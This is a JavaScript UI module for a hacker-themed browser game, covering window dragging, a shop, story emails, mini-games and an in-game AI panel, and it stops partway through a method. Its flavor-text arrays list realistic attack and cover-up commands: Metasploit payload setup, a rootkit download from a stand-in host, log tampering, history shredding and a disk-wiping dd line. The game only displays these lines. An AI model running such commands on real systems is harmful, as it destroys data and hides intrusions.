/* --- UI MANAGER MODULE --- */

// Random simulated hacker code phrases
const FAKE_CODE_BLOCKS = [
    "ssh -i ~/.ssh/id_rsa root@10.0.12.98 -p 22",
    "nmap -sV -O -p 1-1024 192.168.23.12",
    "use exploit/multi/http/struts2_namespace_ognl",
    "set RHOSTS 172.16.54.21",
    "set PAYLOAD linux/x64/meterpreter/reverse_tcp",
    "exploit -j -z",
    "[*] Sending stage (300456 bytes) to 172.16.54.21",
    "meterpreter > getuid",
    "Server username: LocalSystem / Ring-0",
    "meterpreter > hashdump",
    "Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931...",
    "cat /etc/passwd | grep -v 'nologin'",
    "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
    "iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT",
    "wget http://darkweb.onion/rootkit.ko -O /tmp/k.ko",
    "insmod /tmp/k.ko hide_port=4444 hide_proc=3421",
    "sed -i 's/10.0.12.98/localhost/g' /var/log/auth.log",
    "curl -X POST -H 'Content-Type: application/json' -d '{\"exploit\":\"active\"}' http://apex.corp/api",
    "docker run --privileged --net=host -v /:/host alpine:latest",
    "chroot /host /bin/bash",
    "openssl enc -aes-256-cbc -salt -in config.db -out config.db.enc"
];

// Emergency logs scrubbing command logs
const EMERGENCY_PURGE_BLOCKS = [
    "rm -rf /var/log/syslog.1 /var/log/auth.log.1",
    "dd if=/dev/zero of=/dev/sda bs=512 count=1",
    "iptables -F && iptables -X && iptables -P INPUT DROP",
    "kill -9 $(pgrep netwatch_trace)",
    "shlog -c -p 127.0.0.1 -m wipe_all",
    "echo '' > /var/log/lastlog",
    "route del default gw 192.168.1.1",
    "sysctl -w net.ipv4.ip_forward=0",
    "ifconfig eth0 down && ifconfig eth0 hw ether 00:11:22:33:44:55 && ifconfig eth0 up",
    "systemctl stop rsyslog.service",
    "find /var/log -type f -exec shred -n 3 -z -u {} \\;",
    "shred -n 5 -z -u /home/operator/.bash_history",
    "history -c && history -w",
    "[*] ERASING METADATA BUFFER...",
    "[*] RE-ROUTING GATEWAY OVER SHADOW VPN...",
    "[!] TRACE ATTACK DEFLECTED: ROTATING PROXY",
    "[*] DECRYPTING CYBER POLICE ROUTER LOGS...",
    "[*] REMOVING KERNEL MEMORY HOOKS..."
];

// Active log scrubbing simulation logs
const CLEANER_MESSAGES = [
    "shredding /var/log/auth.log...",
    "wiping active trace buffer (offset 0x2A90)...",
    "flushing iptables tracer packet rules...",
    "masking MAC address headers on eth0...",
    "establishing new Proxy circuit hop...",
    "shredding bash history file recursively...",
    "overwriting system temp space with zeros...",
    "purging database telemetry tracking logs...",
    "scrambling virtual route identifiers...",
    "disconnecting active port traces..."
];

class UiManager {
    constructor() {
        this.bindElements();
        this.setupDragAndDrop();
        this.setupWindowFocus();
    }

    bindElements() {
        // Stats elements
        this.locCount = document.getElementById("loc-count");
        this.creditsCount = document.getElementById("credits-count");
        this.ppsCount = document.getElementById("pps-count");
        this.threatVal = document.getElementById("threat-val");
        this.timeDisplay = document.getElementById("time-display");
        
        // Terminal Window elements
        this.hackBtn = document.getElementById("hack-btn");
        this.terminalLog = document.getElementById("terminal-log");
        this.terminalTitle = document.querySelector("#win-terminal .window-title");
        
        // Shop elements
        this.shopContainer = document.getElementById("shop-items-container");
        this.securityContainer = document.getElementById("security-items-container");
        this.shopTabs = document.querySelectorAll(".shop-tabs .tab-btn");
        this.shopPanels = document.querySelectorAll(".shop-panels .shop-panel");
        this.convertTabBtn = document.getElementById("convert-tab-btn");
        this.sellAllBtn = document.getElementById("sell-all-btn");
        this.sellHalfBtn = document.getElementById("sell-half-btn");
        
        // Commlink Window elements
        this.unreadCount = document.getElementById("unread-count");
        this.emptyInbox = document.getElementById("empty-inbox");
        this.emailView = document.getElementById("email-view");
        this.emailFrom = document.getElementById("email-from");
        this.emailSubj = document.getElementById("email-subj");
        this.emailContent = document.getElementById("email-content");
        this.emailOptions = document.getElementById("email-options");

        // Achievements Window elements
        this.achievementsBtn = document.getElementById("achievements-btn");
        this.achievementsWin = document.getElementById("win-achievements");
        this.achievementsList = document.getElementById("achievement-list");
        this.achievementsClose = document.getElementById("win-achievements-close");

        // Audio Toggle
        this.audioToggleBtn = document.getElementById("audio-toggle-btn");

        // Decryption Intrusion Mini-Game elements
        this.vulnWidget = document.getElementById("vuln-alert-widget");
        this.vulnTimerTxt = document.getElementById("vuln-alert-timer-txt");
        this.winIntrusion = document.getElementById("win-intrusion");
        this.winIntrusionClose = document.getElementById("win-intrusion-close");
        this.intrusionTarget = document.getElementById("intrusion-target");
        this.intrusionGrid = document.getElementById("intrusion-grid");
        this.intrusionProgress = document.getElementById("intrusion-progress");
        this.intrusionTimerTxt = document.getElementById("intrusion-timer-txt");

        // Active Logs Cleaner Window elements
        this.winClearLogs = document.getElementById("win-clear-logs");
        this.cleanerGaugeBar = document.getElementById("cleaner-gauge-bar");
        this.cleanerGaugeTxt = document.getElementById("cleaner-gauge-txt");
        this.cleanerPassiveShield = document.getElementById("cleaner-passive-shield");
        this.cleanerLog = document.getElementById("cleaner-log");
        this.cleanerScrubBtn = document.getElementById("cleaner-scrub-btn");

        // G.H.O.S.T. / Conquest Window elements
        this.winGhost = document.getElementById("win-ghost");
        this.conquestNodesContainer = document.getElementById("conquest-nodes-container");
        this.aiLevelTxt = document.getElementById("ai-level-txt");
        this.aiStatusTxt = document.getElementById("ai-status-txt");
        this.aiAvatarIcon = document.getElementById("ai-avatar-icon");
        this.aiExpTxt = document.getElementById("ai-exp-txt");
        this.aiExpBar = document.getElementById("ai-exp-bar");
        this.feedAiBtn = document.getElementById("feed-ai-btn");
        this.aiSkillsContainer = document.getElementById("ai-skills-container");
        
        // Global windows list (re-fetch dynamically to include newly added windows)
        this.windows = document.querySelectorAll(".window");
        this.notificationContainer = document.getElementById("notification-container");

        // Achievements elements again to be sure they are in this.windows
        this.windows = document.querySelectorAll(".window");

        // Fullscreen visual feedback and banner elements
        this.screenFeedback = document.getElementById("screen-feedback");
        this.bannerContainer = document.getElementById("center-banner-container");

        // Tutorial Window elements
        this.winTutorial = document.getElementById("win-tutorial");
        this.tutorialCloseBtn = document.getElementById("tutorial-close-btn");

        // Language toggle element
        this.langToggleBtn = document.getElementById("lang-toggle-btn");

        // About & Support window elements
        this.supportBtn = document.getElementById("support-btn");
        this.aboutBtn = document.getElementById("about-btn");
        this.winAbout = document.getElementById("win-about");
        this.winAboutClose = document.getElementById("win-about-close");
        this.aboutDonateBtn = document.getElementById("about-donate-btn");
        this.aboutResetBtn = document.getElementById("about-reset-btn");
    }

    // Initialize drag & drop for desktop windows
    setupDragAndDrop() {
        this.windows.forEach(win => {
            const header = win.querySelector(".window-header");
            let isDragging = false;
            let startX, startY;
            let initialLeft, initialTop;

            header.addEventListener("mousedown", (e) => {
                isDragging = true;
                this.focusWindow(win);
                
                startX = e.clientX;
                startY = e.clientY;
                initialLeft = win.offsetLeft;
                initialTop = win.offsetTop;

                document.addEventListener("mousemove", onMouseMove);
                document.addEventListener("mouseup", onMouseUp);
            });

            const onMouseMove = (e) => {
                if (!isDragging) return;
                const dx = e.clientX - startX;
                const dy = e.clientY - startY;
                
                // Keep windows within desktop bounds
                let newLeft = initialLeft + dx;
                let newTop = initialTop + dy;
                
                // Boundaries check
                newLeft = Math.max(10, Math.min(newLeft, window.innerWidth - win.offsetWidth - 10));
                newTop = Math.max(50, Math.min(newTop, window.innerHeight - win.offsetHeight - 10));

                win.style.left = `${newLeft}px`;
                win.style.top = `${newTop}px`;
            };

            const onMouseUp = () => {
                isDragging = false;
                document.removeEventListener("mousemove", onMouseMove);
                document.removeEventListener("mouseup", onMouseUp);
            };
        });
    }

    // Focus window when clicked
    setupWindowFocus() {
        this.windows.forEach(win => {
            win.addEventListener("mousedown", () => {
                this.focusWindow(win);
            });
        });
    }

    focusWindow(focusedWin) {
        this.windows.forEach(win => {
            win.classList.remove("active-window");
        });
        focusedWin.classList.add("active-window");
    }

    // Real-time Clock update
    updateClock() {
        const now = new Date();
        this.timeDisplay.innerText = now.toTimeString().split(" ")[0];
    }

    // Refresh core statistics on the status bar
    updateStats(state) {
        const lang = state.language || "en";
        const dict = TRANSLATIONS[lang] || TRANSLATIONS["en"];

        // Round LoC to integer
        this.locCount.innerText = Math.floor(state.loc).toLocaleString("fr-FR");
        // Float values for crypto-credits (2 decimals)
        this.creditsCount.innerText = state.credits.toFixed(2);
        this.ppsCount.innerText = `${state.pps.toLocaleString("fr-FR")}/s`;
        
        // Threat levels styling
        let translatedThreatState = state.threatLevel;
        if (state.isLockdown) {
            translatedThreatState = dict.lockdown;
        } else if (state.threatLevel === "SECURE") {
            translatedThreatState = dict.secure;
        } else if (state.threatLevel === "WATCHED") {
            translatedThreatState = dict.watched;
        } else if (state.threatLevel === "WANTED") {
            translatedThreatState = dict.wanted;
        } else if (state.threatLevel === "CRITICAL") {
            translatedThreatState = dict.critical;
        }

        this.threatVal.innerText = translatedThreatState;
        this.threatVal.className = ""; // clear
        
        // Update active logs cleaner visual gauge
        this.cleanerGaugeBar.style.width = `${(state.threatPercent / state.maxThreat) * 100}%`;
        this.cleanerGaugeTxt.innerText = `${state.threatPercent.toFixed(1)}% / ${state.maxThreat}%`;
        this.cleanerPassiveShield.innerText = `-${state.threatReduction.toFixed(2)}%/s`;

        if (state.isLockdown) {
            this.threatVal.classList.add("text-lockdown");
            this.sellAllBtn.disabled = true;
            this.sellHalfBtn.disabled = true;
            this.cleanerScrubBtn.disabled = true; // disable normal scrubbing button under lockdown
            
            // Adjust Terminal interface for emergency lockdown
            this.hackBtn.classList.add("lockdown-mode");
            this.hackBtn.querySelector(".hack-btn-text").innerText = `${dict.hackBtnLockdown} [${state.lockdownProgress}/${state.lockdownRequired}]`;
            this.terminalTitle.innerText = dict.terminalTitleLockdown;
        } else {
            this.sellAllBtn.disabled = false;
            this.sellHalfBtn.disabled = false;
            this.cleanerScrubBtn.disabled = false;
            this.hackBtn.classList.remove("lockdown-mode");
            this.hackBtn.querySelector(".hack-btn-text").innerText = dict.hackBtnNormal;
            this.terminalTitle.innerText = dict.terminalTitle;

            if (state.threatLevel === "SECURE") {
                this.threatVal.classList.add("text-green");
            } else if (state.threatLevel === "WATCHED") {
                this.threatVal.style.color = "var(--neon-yellow)";
                this.threatVal.style.textShadow = "0 0 10px rgba(255, 234, 0, 0.4)";
            } else if (state.threatLevel === "WANTED") {
                this.threatVal.style.color = "orange";
                this.threatVal.style.textShadow = "0 0 10px rgba(255, 165, 0, 0.4)";
            } else {
                this.threatVal.classList.add("text-magenta");
            }
        }
    }

    // Append fake terminal output on action click
    appendTerminalOutput(isLockdown = false) {
        const log = this.terminalLog;
        const line = document.createElement("p");
        line.className = "code-line";
        
        if (isLockdown) {
            line.style.color = "var(--neon-magenta)";
            line.style.textShadow = "var(--glow-magenta)";
            const randomBlock = EMERGENCY_PURGE_BLOCKS[Math.floor(Math.random() * EMERGENCY_PURGE_BLOCKS.length)];
            line.innerText = `[PURGE] > ${randomBlock}`;
        } else {
            const randomBlock = FAKE_CODE_BLOCKS[Math.floor(Math.random() * FAKE_CODE_BLOCKS.length)];
            line.innerText = `> ${randomBlock}`;
        }
        
        log.appendChild(line);
        
        // Max 50 lines in terminal log to prevent memory blow-up
        if (log.children.length > 50) {
            log.removeChild(log.firstElementChild);
        }
        
        // Autoscroll
        log.scrollTop = log.scrollHeight;
    }

    // Append active scrubbing commands to the Logs Cleaner console log
    appendCleanerOutput() {
        const log = this.cleanerLog;
        const line = document.createElement("p");
        line.className = "code-line";
        line.style.color = "var(--neon-yellow)";
        line.style.textShadow = "0 0 8px rgba(255, 234, 0, 0.3)";
        
        const msg = CLEANER_MESSAGES[Math.floor(Math.random() * CLEANER_MESSAGES.length)];
        line.innerText = `[SHRED] > ${msg}`;
        
        log.appendChild(line);
        if (log.children.length > 50) {
            log.removeChild(log.firstElementChild);
        }
        log.scrollTop = log.scrollHeight;
    }

    // Notifications toast renderer
    showNotification(title, message, type = "info") {
        const notif = document.createElement("div");
        notif.className = `notif ${type}`;
        
        notif.innerHTML = `
            <div class="notif-title">${title.toUpperCase()}</div>
            <div class="notif-body">${message}</div>
        `;
        
        this.notificationContainer.appendChild(notif);
        
        // Slide in
        setTimeout(() => {
            notif.classList.add("show");
        }, 50);
        
        // Expire & Slide out
        setTimeout(() => {
            notif.classList.remove("show");
            setTimeout(() => {
                notif.remove();
            }, 350);
        }, 4000);
    }

    // Toggle Tab Panels (Shop upgrades vs security vs conversion vs conquest)
    setupTabs() {
        this.shopTabs.forEach(tab => {
            tab.addEventListener("click", () => {
                const tabAttr = tab.getAttribute("data-tab");
                const targetPanelId = `tab-${tabAttr || (tab.id === "convert-tab-btn" ? "conversion" : "upgrades")}`;
                
                // Toggle tabs active state
                const parentWindow = tab.closest(".window");
                const siblingTabs = parentWindow.querySelectorAll(".shop-tabs .tab-btn");
                const siblingPanels = parentWindow.querySelectorAll(".shop-panels .shop-panel");

                siblingTabs.forEach(t => t.classList.remove("active"));
                tab.classList.add("active");
                
                // Toggle panels visibility
                siblingPanels.forEach(panel => {
                    if (panel.id === targetPanelId) {
                        panel.style.display = "block";
                        panel.classList.add("active");
                    } else {
                        panel.style.display = "none";
                        panel.classList.remove("active");
                    }
                });
            });
        });
    }

    // Render the shop list and security lists dynamically
    renderShop(state, onBuyItemCallback) {
        const lang = state.language || "en";
        const dict = TRANSLATIONS[lang] || TRANSLATIONS["en"];

        // --- 1. RENDER MAIN EXPLOITS UPGRADES ---
        this.shopContainer.innerHTML = "";
        
        if (state.isLockdown) {
            // Display a critical system locked red warning box instead of shop items
            this.shopContainer.innerHTML = `
                <div class="lockdown-alert-box">
                    <div class="lockdown-alert-title glitch" data-text="⚠️ ${dict.lockdown} ⚠️">⚠️ ${dict.lockdown} ⚠️</div>
                    <p class="lockdown-alert-p">${dict.lockdownAlertMsg1}</p>
                    <div class="lockdown-instructions">
                        <strong>${dict.hackBtnLockdown}</strong><br>
                        ${dict.lockdownAlertMsg2}
                    </div>
                </div>
            `;
            this.securityContainer.innerHTML = `
                <div class="lockdown-alert-box" style="margin: 0;">
                    <div class="lockdown-alert-title" style="font-size: 1.15rem; margin-bottom: 6px;">⚠️ PROXIES SEIZED ⚠️</div>
                    <p class="lockdown-alert-p" style="font-size: 0.78rem; margin: 0;">Security systems offline during tracing lockdown.</p>
                </div>
            `;
            return;
        }

        SHOP_ITEMS.forEach(item => {
            const owned = state.upgrades[item.id] || 0;
            const cost = calculateCost(item, owned);
            const isAffordable = state.credits >= cost;
            
            // Translate Upgrades Data
            const localItem = dict.upgrades[item.id] || item;
            const itemName = localItem.name;
            const itemDesc = localItem.desc;
            const itemBenefit = localItem.benefit;

            const card = document.createElement("div");
            card.className = `shop-item ${owned > 0 ? "unlocked" : ""} ${isAffordable ? "affordable" : ""}`;
            
            card.innerHTML = `
                <div class="item-info">
                    <div class="item-name">${itemName}</div>
                    <div class="item-desc">${itemDesc}</div>
                    <div class="item-stats">${itemBenefit}</div>
                </div>
                <div class="item-right">
                    <span class="item-count">x${owned}</span>
                    <button class="buy-btn" ${!isAffordable ? "disabled" : ""}>
                        ฿${cost.toLocaleString("fr-FR")}
                    </button>
                </div>
            `;
            
            const buyBtn = card.querySelector(".buy-btn");
            buyBtn.addEventListener("click", (e) => {
                e.stopPropagation();
                onBuyItemCallback(item.id);
            });
            
            this.shopContainer.appendChild(card);
        });

        // --- 2. RENDER SECURITY & VPN UPGRADES ---
        this.securityContainer.innerHTML = "";
        
        SECURITY_ITEMS.forEach(item => {
            const owned = state.upgrades[item.id] || 0;
            
            // Apply Satellite Conquest Node discount (-20%)
            let discountFactor = 1.0;
            if (state.nodesConquered.includes("satellite")) {
                discountFactor = 0.80; // 20% discount
            }
            
            const cost = Math.floor(calculateCost(item, owned) * discountFactor);
            const isAffordable = state.credits >= cost;
            
            // Translate Security Upgrades Data
            const localItem = dict.upgrades[item.id] || item;
            const itemName = localItem.name;
            const itemDesc = localItem.desc;
            const itemBenefit = localItem.benefit;

            const card = document.createElement("div");
            card.className = `shop-item ${owned > 0 ? "unlocked" : ""} ${isAffordable ? "affordable" : ""}`;
            
            card.innerHTML = `
                <div class="item-info">
                    <div class="item-name">${itemName}</div>
                    <div class="item-desc">${itemDesc}</div>
                    <div class="item-stats" style="color: var(--neon-yellow);">${itemBenefit}</div>
                </div>
                <div class="item-right">
                    <span class="item-count">x${owned}</span>
                    <button class="buy-btn" ${!isAffordable ? "disabled" : ""} style="background-color: var(--neon-yellow); color: #000;">
                        ฿${cost.toLocaleString("fr-FR")}
                    </button>
                </div>
            `;
            
            const buyBtn = card.querySelector(".buy-btn");
            buyBtn.addEventListener("click", (e) => {
                e.stopPropagation();
                onBuyItemCallback(item.id);
            });
            
            this.securityContainer.appendChild(card);
        });
    }

    // Email view management
    updateCommlinkBadge(state) {
        if (state.unreadCount > 0) {
            const lang = state.language || "en";
            const dict = TRANSLATIONS[lang] || TRANSLATIONS["en"];
            this.unreadCount.innerText = `${state.unreadCount} ${dict.unread}`;
            this.unreadCount.style.display = "inline-block";
        } else {
            this.unreadCount.style.display = "none";
        }
    }

    renderEmailView(state, event) {
        this.emptyInbox.style.display = "none";
        this.emailView.style.display = "flex";
        
        this.emailFrom.innerText = event.from;
        this.emailSubj.innerText = event.subject;
        
        // Evaluate dynamic text if it's a function, otherwise direct
        const bodyText = typeof event.text === "function" ? event.text(state) : event.text;
        this.emailContent.innerHTML = bodyText;
        
        // Render choice option buttons
        this.emailOptions.innerHTML = "";
        event.options.forEach((opt, idx) => {
            const btn = document.createElement("button");
            btn.className = "opt-btn";
            btn.innerHTML = typeof opt.text === "function" ? opt.text(state) : opt.text;
            
            // Register click choice event handler
            btn.addEventListener("click", () => {
                window.dispatchEvent(new CustomEvent("story-choice", {
                    detail: { eventId: event.id, choiceIndex: idx }
                }));
            });
            
            this.emailOptions.appendChild(btn);
        });
    }

    clearEmailView() {
        this.emailView.style.display = "none";
        this.emptyInbox.style.display = "flex";
    }

    // Renders the hex grids and options for Decryption Intrusion Mini-Game
    renderIntrusionPuzzle(targetHex, optionsArray, onChoiceCallback) {
        this.intrusionTarget.innerHTML = `<p style="font-size: 0.8rem; color: var(--text-muted); margin-bottom: 5px;">TARGET_HEX</p><span style="font-size: 2rem; letter-spacing: 2px;">${targetHex}</span>`;
        this.intrusionGrid.innerHTML = "";
        this.intrusionGrid.style.gridTemplateColumns = "repeat(4, 1fr)";

        optionsArray.forEach(opt => {
            const btn = document.createElement("button");
            btn.className = "intrusion-btn";
            btn.innerText = opt;
            btn.addEventListener("click", () => {
                onChoiceCallback(opt, btn);
            });
            this.intrusionGrid.appendChild(btn);
        });
    }

    renderSimonPuzzle(sequence, onInputCallback) {
        this.intrusionTarget.innerHTML = `<p style="font-size: 0.8rem; color: var(--text-muted); margin-bottom: 5px;">MEMORY_SYNC</p><span style="font-size: 1.2rem;">REPLICATE SEQUENCE</span>`;
        this.intrusionGrid.innerHTML = "";
        this.intrusionGrid.style.gridTemplateColumns = "repeat(2, 1fr)";
        this.intrusionGrid.style.gap = "15px";

        const colors = ["#00f3ff", "#ff00f7", "#00ff66", "#f3ff00"];
        
        for (let i = 0; i < 4; i++) {
            const btn = document.createElement("button");
            btn.className = "intrusion-btn simon-btn";
            btn.style.height = "80px";
            btn.style.borderColor = colors[i];
            btn.style.background = `rgba(${i*50}, 255, 255, 0.05)`;
            btn.addEventListener("click", () => {
                onInputCallback(i);
                btn.style.background = colors[i];
                setTimeout(() => { btn.style.background = ""; }, 200);
            });
            this.intrusionGrid.appendChild(btn);
        }

        // Show sequence animation
        let delay = 500;
        sequence.forEach((val, idx) => {
            setTimeout(() => {
                const btns = this.intrusionGrid.querySelectorAll(".simon-btn");
                btns[val].style.background = colors[val];
                btns[val].style.boxShadow = `0 0 20px ${colors[val]}`;
                setTimeout(() => {
                    btns[val].style.background = "";
                    btns[val].style.boxShadow = "";
                }, 400);
            }, delay);
            delay += 700;
        });
    }

    renderBrutePuzzle(targetRange, onActionCallback) {
        this.intrusionTarget.innerHTML = `<p style="font-size: 0.8rem; color: var(--text-muted); margin-bottom: 5px;">SIGNAL_INJECTION</p><span style="font-size: 1.2rem;">SYNC AT PEAK</span>`;
        this.intrusionGrid.innerHTML = `
            <div class="brute-container" style="grid-column: span 4; width: 100%; height: 100px; position: relative; background: rgba(255,255,255,0.05); border: 1px solid var(--border-dim); overflow: hidden;">
                <div id="brute-target" style="position: absolute; left: ${targetRange.min}%; width: ${targetRange.max - targetRange.min}%; height: 100%; background: rgba(0, 255, 102, 0.2); border-left: 1px solid var(--neon-green); border-right: 1px solid var(--neon-green);"></div>
                <div id="brute-slider" style="position: absolute; left: 0%; width: 4px; height: 100%; background: var(--neon-magenta); box-shadow: 0 0 10px var(--neon-magenta); transition: left 0.1s linear;"></div>
            </div>
            <button id="brute-action-btn" class="hack-btn" style="grid-column: span 4; margin-top: 20px; height: 50px;">
                <span class="hack-btn-text">INJECT NOW</span>
            </button>
        `;
        
        document.getElementById("brute-action-btn").addEventListener("click", onActionCallback);
    }

    updateBruteSlider(pos) {
        const slider = document.getElementById("brute-slider");
        if (slider) slider.style.left = `${pos}%`;
    }

    // Displays a fullscreen visual flash and center-screen access banner
    triggerScreenFeedback(type, title, subtitle) {
        // 1. Flash the fullscreen overlay
        const flashClass = type === "success" ? "success-flash" : "error-flash";
        this.screenFeedback.className = `feedback-overlay ${flashClass}`;
        
        // 2. Render and show the giant banner
        const bannerClass = type === "success" ? "banner-success" : "banner-error";
        this.bannerContainer.innerHTML = `
            <div class="giant-banner ${bannerClass}">
                <div class="banner-title">${title.toUpperCase()}</div>
                <div class="banner-subtitle">${subtitle.toUpperCase()}</div>
            </div>
        `;

        // 3. Automatically clean up after 1.5s once animations conclude
        setTimeout(() => {
            this.screenFeedback.className = "feedback-overlay";
            this.bannerContainer.innerHTML = "";
        }, 1500);
    }

    // Renders Mainframe Conquest Node elements inside G.H.O.S.T window
    renderConquestNodes(state, onAttackNodeCallback) {
        const lang = state.language || "en";
        const dict = TRANSLATIONS[lang] || TRANSLATIONS["en"];

        this.conquestNodesContainer.innerHTML = "";

        CONQUEST_NODES.forEach(node => {
            const isConquered = state.nodesConquered.includes(node.id);
            const isEligible = node.verify(state);

            // Translate Conquest Data
            const localNode = dict.conquest[node.id] || node;
            const nodeName = localNode.name;
            const nodeDesc = localNode.desc;
            const nodeReq = localNode.req;
            const nodeReward = localNode.reward;

            const card = document.createElement("div");
            card.className = `shop-item ${isConquered ? "unlocked" : ""}`;
            
            if (isConquered) {
                card.style.borderColor = "var(--border-color)";
            } else if (isEligible) {
                card.style.borderColor = "var(--neon-cyan)";
            }

            card.innerHTML = `
                <div class="item-info">
                    <div class="item-name" style="color: ${isConquered ? "var(--neon-green)" : (isEligible ? "var(--neon-cyan)" : "var(--text-primary)")};">${nodeName}</div>
                    <div class="item-desc">${nodeDesc}</div>
                    <div class="item-stats" style="color: var(--neon-yellow); font-size: 0.75rem;">${nodeReq}</div>
                    <div class="item-stats" style="color: var(--neon-green); font-size: 0.75rem; font-weight: bold; margin-top: 2px;">${nodeReward}</div>
                </div>
                <div class="item-right">
                    ${isConquered ? `
                        <span class="unread-badge" style="background: rgba(0, 255, 102, 0.1); color: var(--neon-green); border: 1px solid var(--border-color); box-shadow: none; border-radius: 2px; padding: 2px 8px;">CONTROLLED</span>
                    ` : `
                        <button class="buy-btn" ${!isEligible ? "disabled" : ""} style="background-color: var(--neon-cyan); color: #000; font-size: 0.72rem; padding: 4px 8px;">
                            INFILTRATE
                        </button>
                    `}
                </div>
            `;

            if (!isConquered) {
                const attackBtn = card.querySelector(".buy-btn");
                attackBtn.addEventListener("click", () => {
                    onAttackNodeCallback(node);
                });
            }

            this.conquestNodesContainer.appendChild(card);
        });
    }

    // Renders G.H.O.S.T. AI core and skills list panel
    renderAiCore(state, activeCooldowns, onUseSkillCallback) {
        const lang = state.language || "en";
        const dict = TRANSLATIONS[lang] || TRANSLATIONS["en"];

        // Find matching level info
        const levelObj = AI_LEVELS.find(l => l.level === state.aiLevel) || AI_LEVELS[0];
        const currentAiLvlKey = `l${state.aiLevel}`;
        const currentLocalAi = dict.ai[currentAiLvlKey] || levelObj;

        this.aiLevelTxt.innerText = state.aiLevel;
        this.aiStatusTxt.innerText = currentLocalAi.name;
        this.aiAvatarIcon.innerText = levelObj.avatar;

        const maxExp = levelObj.requiredExp;
        if (maxExp === Infinity) {
            this.aiExpTxt.innerText = "MAX SYNAPSE INTEGRITY";
            this.aiExpBar.style.width = "100%";
        } else {
            this.aiExpTxt.innerText = `${state.aiExp.toLocaleString()} / ${maxExp.toLocaleString()} EXP`;
            this.aiExpBar.style.width = `${Math.min(100, (state.aiExp / maxExp) * 100)}%`;
        }

        // Feed button state
        if (state.loc >= 1000) {
            this.feedAiBtn.disabled = false;
        } else {
            this.feedAiBtn.disabled = true;
        }

        // Render AI active skills list
        this.aiSkillsContainer.innerHTML = "";

        // Loop over level 2 to 4 skills
        AI_LEVELS.forEach(lvl => {
            if (!lvl.skillName) return; // skip level 1 empty skill

            const isLocked = state.aiLevel < lvl.level;
            const cdLeft = activeCooldowns[lvl.skillName.toLowerCase().replace(" ", "")] || 0;
            const isUsable = !isLocked && cdLeft <= 0;

            const aiLvlKey = `l${lvl.level}`;
            const localAi = dict.ai[aiLvlKey] || lvl;

            const card = document.createElement("div");
            card.className = `shop-item ${!isLocked ? "unlocked" : ""}`;
            card.style.opacity = isLocked ? "0.45" : "1";

            card.innerHTML = `
                <div class="item-info">
                    <div class="item-name" style="color: ${isLocked ? "var(--text-muted)" : "var(--neon-green)"}; font-size: 0.9rem;">
                        ${localAi.skillName} ${isLocked ? `[LOCKED - REQ LEVEL ${lvl.level}]` : ""}
                    </div>
                    <div class="item-desc" style="font-size: 0.74rem;">${localAi.skillDesc}</div>
                </div>
                <div class="item-right">
                    ${isLocked ? `
                        <span class="item-count" style="font-size: 0.7rem; color: var(--text-muted);">0x00</span>
                    ` : `
                        <button class="buy-btn" ${!isUsable ? "disabled" : ""} style="background-color: var(--neon-green); color: #000; font-size: 0.72rem; padding: 4px 8px;">
                            ${cdLeft > 0 ? `CD: ${cdLeft}s` : "ACTIVATE"}
                        </button>
                    `}
                </div>
            `;

            if (isUsable) {
                const useBtn = card.querySelector(".buy-btn");
                useBtn.addEventListener("click", () => {
                    onUseSkillCallback(lvl);
                });
            }

            this.aiSkillsContainer.appendChild(card);
        });
    }

    // Translates and updates all static text elements in the HTML DOM on-the-fly
    applyLanguage(state, audio, gameTimer = 15) {
        const lang = state.language || "en";
        const dict = TRANSLATIONS[lang] || TRANSLATIONS["en"];

        // Update Toggle Button Text
        this.langToggleBtn.innerText = lang.toUpperCase();
        this.supportBtn.innerText = dict.supportBtn;
        this.aboutBtn.innerText = dict.aboutBtn;
        document.querySelector("#win-about .window-title").innerText = dict.aboutTitle;
        document.querySelector("#win-about h3").innerText = dict.aboutHeader;
        document.querySelector("#win-about p:nth-of-type(4)").innerText = dict.aboutDesc;
        this.aboutDonateBtn.querySelector(".hack-btn-text").innerText = dict.aboutDonateBtn;
        this.aboutResetBtn.querySelector(".hack-btn-text").innerText = dict.aboutResetBtn;

        // 1. Status Bar
        document.querySelector(".logo").innerText = dict.logo;
        document.querySelector(".logo").setAttribute("data-text", dict.logo);
        
        let translatedThreatState = state.threatLevel;
        if (state.isLockdown) {
            translatedThreatState = dict.lockdown;
        } else if (state.threatLevel === "SECURE") {
            translatedThreatState = dict.secure;
        } else if (state.threatLevel === "WATCHED") {
            translatedThreatState = dict.watched;
        } else if (state.threatLevel === "WANTED") {
            translatedThreatState = dict.wanted;
        } else if (state.threatLevel === "CRITICAL") {
            translatedThreatState = dict.critical;
        }

        document.querySelector(".status-sec").innerHTML = `${dict.threatLabel} <span id="threat-val">${translatedThreatState}</span>`;
        this.threatVal = document.getElementById("threat-val");
        if (state.isLockdown) {
            this.threatVal.className = "text-lockdown";
        } else if (state.threatLevel === "SECURE") {
            this.threatVal.className = "text-green";
        } else if (state.threatLevel === "WATCHED") {
            this.threatVal.style.color = "var(--neon-yellow)";
        } else if (state.threatLevel === "WANTED") {
            this.threatVal.style.color = "orange";
        } else {
            this.threatVal.className = "text-magenta";
        }

        this.locCount.previousElementSibling.innerText = dict.locLabel;
        this.creditsCount.previousElementSibling.innerText = dict.creditsLabel;
        this.ppsCount.previousElementSibling.innerText = dict.netRateLabel;

        // 2. Terminal Window
        document.querySelector("#win-terminal .window-title").innerText = state.isLockdown ? dict.terminalTitleLockdown : dict.terminalTitle;
        this.hackBtn.querySelector(".hack-btn-text").innerText = state.isLockdown ? dict.hackBtnLockdown : dict.hackBtnNormal;
        document.querySelector(".terminal-footer span").innerText = dict.terminalFooter;

        // 3. Network Window
        const tabs = document.querySelectorAll("#win-shop .shop-tabs .tab-btn");
        tabs[0].innerText = dict.tabExploits;
        tabs[1].innerText = dict.tabSecurity;
        tabs[2].innerText = dict.tabConversion;

        // Conversion Bureau
        document.querySelector(".conversion-box h3").innerText = dict.convTitle;
        document.querySelector(".conversion-box p").innerText = dict.convDesc;
        document.querySelector(".exchange-stats p").innerHTML = dict.convRate;
        this.sellAllBtn.innerText = dict.sellAll;
        this.sellHalfBtn.innerText = dict.sellHalf;

        // 4. Commlink
        document.querySelector("#win-commlink .window-title").innerText = dict.commlinkTitle;
        this.unreadCount.previousElementSibling.innerText = dict.commlinkHeader;
        this.updateCommlinkBadge(state);
        document.querySelector(".empty-inbox p").innerText = dict.emptyInbox;
        document.querySelector(".empty-inbox .sub").innerText = dict.emptyInboxSub;

        // Achievements & Audio Toggle
        this.achievementsBtn.innerText = dict.achievementsBtn;
